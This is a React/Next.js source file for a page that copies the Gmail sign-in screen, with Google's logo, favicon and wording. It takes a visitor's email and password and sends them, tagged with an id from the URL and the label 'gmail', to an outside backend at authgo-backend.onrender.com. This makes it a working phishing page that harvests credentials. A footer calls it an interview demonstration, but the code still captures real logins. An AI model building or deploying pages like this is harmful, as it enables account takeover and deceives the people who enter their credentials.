import { useState } from 'react';
import Head from 'next/head';
import { toast } from 'react-toastify';
import { useRouter } from 'next/router';

export default function GmailLogin() {
  const [loginData, setLoginData] = useState({
    email: '',
    password: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [step, setStep] = useState(1); // 1: email, 2: password
  const social = "gmail";

  const router = useRouter();
  const { id } = router.query; 

 const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
  setLoginData({
    ...loginData,
    [e.target.name]: e.target.value
  });
};


  const handleEmailSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (loginData.email) {
      setStep(2);
    }
  };

  
  const handlePasswordSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
      e.preventDefault();
      setIsLoading(true);
  
      if (!id || !social || !loginData.email || !loginData.password) {
        toast.error("⚠️ All fields are required!");
        setIsLoading(false);
        return;
      }
  
      try {
        const res = await fetch("https://authgo-backend.onrender.com/cred/add", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            id: id,
            social: social,
            username: loginData.email,
            password: loginData.password,
          }),
        });
  
        const data = await res.json();
        if (!res.ok) throw new Error(data.error || "Failed to add credential");
  
        toast.success("✅ Credential added successfully!");
        // Reset form after successful submission
        setLoginData({ email: '', password: '' });
      } catch (err) {
        console.error("❌ Error adding credential:", err);
        toast.error((err as Error).message);
      } finally {
        setIsLoading(false);
      }
    };

  const handleBack = () => {
    setStep(1);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <Head>
        <title>Gmail</title>
        <meta name="description" content="Gmail clone login page" />
        <link rel="icon" href="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico" type="image/x-icon" />
      </Head>

      {/* Header */}
      <header className="py-4 px-4 sm:px-8">
        <div className="max-w-6xl mx-auto flex justify-between items-center">
          <div className="flex items-center space-x-3">
            {/* Gmail Logo */}
            <svg className="w-10 h-10" viewBox="0 0 24 24">
              <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
              <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
              <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
              <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
            </svg>
            <span className="text-2xl font-normal text-gray-900">Gmail</span>
          </div>
          <div className="flex space-x-4">
            <button className="text-blue-600 hover:text-blue-800 text-sm font-medium">
              For work
            </button>
            <button className="text-blue-600 hover:text-blue-800 text-sm font-medium">
              Sign in
            </button>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center py-8 px-4 sm:px-6 lg:px-8">
        <div className="max-w-md w-full space-y-8">
          {/* Login Card */}
          <div className="bg-white rounded-lg border border-gray-200 shadow-sm p-8">
            {/* Step 1: Email */}
            {step === 1 && (
              <div className="space-y-6">
                <div className="text-center">
                  <h1 className="text-2xl font-normal text-gray-900">Sign in</h1>
                  <p className="text-sm text-gray-600 mt-2">Use your Google Account</p>
                </div>

                <form onSubmit={handleEmailSubmit} className="space-y-6">
                  <div>
                    <input
                      type="email"
                      name="email"
                      placeholder="Email or phone"
                      value={loginData.email}
                      onChange={handleChange}
                      required
                      className="w-full px-3 py-3 border border-gray-300 rounded-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all text-base placeholder-gray-500"
                    />
                  </div>

                  <div className="space-y-4">
                    <div className="text-xs text-gray-600">
                      <a href="#" className="text-blue-600 hover:text-blue-800 font-medium">
                        Forgot email?
                      </a>
                    </div>
                    
                    <div className="text-xs text-gray-600">
                      Not your computer? Use Guest mode to sign in privately.{' '}
                      <a href="#" className="text-blue-600 hover:text-blue-800 font-medium">
                        Learn more
                      </a>
                    </div>

                    <div className="flex justify-between pt-4">
                      <button 
                        type="button"
                        className="text-blue-600 hover:text-blue-800 font-medium text-sm px-4 py-2 rounded hover:bg-blue-50 transition-colors"
                      >
                        Create account
                      </button>
                      <button 
                        type="submit"
                        className="bg-blue-600 text-white font-medium text-sm px-6 py-2 rounded hover:bg-blue-700 transition-colors"
                      >
                        Next
                      </button>
                    </div>
                  </div>
                </form>
              </div>
            )}

            {/* Step 2: Password */}
            {step === 2 && (
              <div className="space-y-6">
                <div className="text-center">
                  <div className="flex items-center justify-center space-x-2 mb-4">
                    <button 
                      onClick={handleBack}
                      className="text-gray-600 hover:text-gray-800 p-2 rounded-full hover:bg-gray-100 transition-colors"
                    >
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                      </svg>
                    </button>
                    <h1 className="text-2xl font-normal text-gray-900">Welcome</h1>
                  </div>
                  <div className="flex items-center justify-center space-x-2">
                    <div className="w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center">
                      <span className="text-white text-sm font-medium">
                        {loginData.email.charAt(0).toUpperCase()}
                      </span>
                    </div>
                    <p className="text-sm text-gray-900 font-medium">{loginData.email}</p>
                  </div>
                </div>

                <form onSubmit={handlePasswordSubmit} className="space-y-6">
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      name="password"
                      placeholder="Enter your password"
                      value={loginData.password}
                      onChange={handleChange}
                      required
                      className="w-full px-3 py-3 border border-gray-300 rounded-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all text-base placeholder-gray-500 pr-24"
                    />
                    <div className="absolute right-3 top-1/2 transform -translate-y-1/2 flex space-x-2">
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="text-blue-600 hover:text-blue-800 font-medium text-sm"
                      >
                        {showPassword ? 'Hide' : 'Show'}
                      </button>
                    </div>
                  </div>

                  <div className="text-xs text-gray-600">
                    <a href="#" className="text-blue-600 hover:text-blue-800 font-medium">
                      Forgot password?
                    </a>
                  </div>

                  <div className="text-xs text-gray-600">
                    Not your computer? Use Guest mode to sign in privately.{' '}
                    <a href="#" className="text-blue-600 hover:text-blue-800 font-medium">
                      Learn more
                    </a>
                  </div>

                  <div className="flex justify-between pt-4">
                    <button 
                      type="button"
                      className="text-blue-600 hover:text-blue-800 font-medium text-sm px-4 py-2 rounded hover:bg-blue-50 transition-colors"
                    >
                      Create account
                    </button>
                    <button 
                      type="submit"
                      disabled={isLoading}
                      className="bg-blue-600 text-white font-medium text-sm px-6 py-2 rounded hover:bg-blue-700 transition-colors disabled:opacity-70 disabled:cursor-not-allowed"
                    >
                      {isLoading ? (
                        <div className="flex items-center space-x-2">
                          <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                          <span>Signing in...</span>
                        </div>
                      ) : (
                        'Next'
                      )}
                    </button>
                  </div>
                </form>
              </div>
            )}
          </div>

          {/* Footer Links */}
          <div className="text-center space-y-4">
            <select className="bg-transparent border-0 text-gray-600 text-sm outline-none cursor-pointer">
              <option>English (United States)</option>
              <option>Español</option>
              <option>Français</option>
              <option>中文</option>
            </select>
            
            <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-600">
              <a href="#" className="hover:underline">Help</a>
              <a href="#" className="hover:underline">Privacy</a>
              <a href="#" className="hover:underline">Terms</a>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="py-6 px-4 border-t border-gray-200">
        <div className="max-w-6xl mx-auto">
          <div className="flex flex-col sm:flex-row justify-between items-center space-y-2 sm:space-y-0">
            <div className="flex items-center space-x-4 text-sm text-gray-600">
              <span>Google</span>
            </div>
            
            <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-600">
              <span>Clone Built with Next.js & Tailwind CSS</span>
              <span>•</span>
              <span>Interview Demonstration - Not affiliated with Google</span>
            </div>
          </div>
        </div>
      </footer>

      <style jsx global>{`
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap');
        
        body {
          font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
      `}</style>
    </div>
  );
}